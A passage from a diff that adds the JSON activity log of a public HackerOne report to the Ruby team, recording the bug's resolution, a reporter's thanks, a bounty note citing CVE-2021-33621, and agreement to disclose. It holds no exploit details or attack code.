A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9e8562a11d9ac4358c2c4d1d8e3bf72413eb2a7678f9ff36c84eca26224211c5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 19313953,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-11-23T02:52:56.139Z",
+      "updated_at": "2022-11-23T02:52:56.139Z",
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065845Z&X-Amz-Expires=3055&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9e8562a11d9ac4358c2c4d1d8e3bf72413eb2a7678f9ff36c84eca26224211c5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "htokumaru",
+        "url": "/htokumaru"
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 19314340,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "対応ありがとうございました",
+      "automated_response": false,
+      "created_at": "2022-11-23T05:08:31.123Z",
+      "updated_at": "2022-11-23T05:08:31.123Z",
+      "actor": {
+        "username": "htokumaru",
+        "cleared": false,
+        "verified": false,
+        "url": "/htokumaru",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/sjwFRaTog4dFsHBYahCn8L8c/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 19326633,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::NotEligibleForBounty",
+      "message": "Bounty については https://hackerone.com/ibb へ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33621 と共に報告をお願いします(任意)",
+      "automated_response": false,
+      "created_at": "2022-11-23T23:22:21.111Z",
+      "updated_at": "2022-11-23T23:22:21.111Z",
+      "actor": {
+        "url": "/ruby",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Ruby"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 19326636,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-11-23T23:23:01.108Z",
+      "updated_at": "2022-11-23T23:23:01.108Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065845Z&X-Amz-Expires=3055&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9e8562a11d9ac4358c2c4d1d8e3bf72413eb2a7678f9ff36c84eca26224211c5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 19326924,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-11-24T01:46:39.869Z",
+      "updated_at": "2022-11-24T01:46:39.869Z",
+      "actor": {
+        "username": "htokumaru",
+        "cleared": false,
+        "verified": false,
+        "url": "/htokumaru",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/sjwFRaTog4dFsHBYahCn8L8c/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 19326925,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-11-24T01:46:39.994Z",
+      "updated_at": "2022-11-24T01:46:39.994Z",
+      "actor": {
+        "username": "htokumaru",
+        "cleared": false,
+        "verified": false,
+        "url": "/htokumaru",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/sjwFRaTog4dFsHBYahCn8L8c/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
